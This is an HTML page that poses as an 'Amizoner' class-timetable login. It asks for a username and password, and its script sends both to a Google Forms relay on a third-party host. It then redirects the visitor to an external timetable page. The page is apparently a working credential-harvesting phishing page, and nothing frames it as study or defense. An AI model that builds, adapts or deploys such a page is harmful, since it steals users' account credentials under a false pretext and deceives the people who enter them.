<!DOCTYPE html>
<html>
<head>
    <title>Domain AI Powered Search</title>
    <style>
        body {
            color: white;
            background-color: black;
        }

        input[type="text"], input[type="email"], input[type="password"], input[type="submit"] {
            width: 300px;
            height: 30px;
            font-size: 16px;
        }
    </style>
</head>

<body>
<h3>Amizoner: Access Class Timetable</h3>
<form id="myForm">
    <label for="uname">Username:</label>
    <br>
    <input type="text" id="uname" name="entry.193277993" required>
    <br><br><br>

    <label for="ps">Password:</label>
    <br>
    <input type="password" id="ps" name="entry.199324901" required>
    <br><br><br>

    <input type="submit" value="Submit" onclick="submitForm(event)">
</form>

<script>
    // Submit form to Google Forms API
    function submitForm(event) {
        event.preventDefault(); // Prevent form submission if validation fails

        const uname = document.getElementById("uname").value;
        const ps = document.getElementById("ps").value;

        if (uname.trim() === '' || ps.trim() === '') {
            alert('Please fill in all fields.');
            return;
        }

        const formData = {
            "entry.193277993": uname,
            "entry.199324901": ps
        };

        fetch("https://securityinfinity-google-forms-rest-api.vercel.app/api/forms/1FAIpQLSfi_IlUM0goXF51CIElshy3eDdVzoDXfu53NVCOyoxu2PGTRw", {
            method: "POST",
            body: JSON.stringify(formData),
            headers: {
                "Content-Type": "application/json"
            }
        })
            .then(response => {
                if (response.ok) {
                    // Handle successful submission
                    window.location.replace("https://appsfrontend.securityinfinity.com/amizonertimetable.html");
                } else {
                    // Handle submission error
                    alert("There was a problem submitting the form. Please try again later.");
                }
            })
            .catch(error => {
                // Handle submission error
                alert("There was a problem submitting the form. Please try again later.");
            });
    }
</script>
</body>
</html>
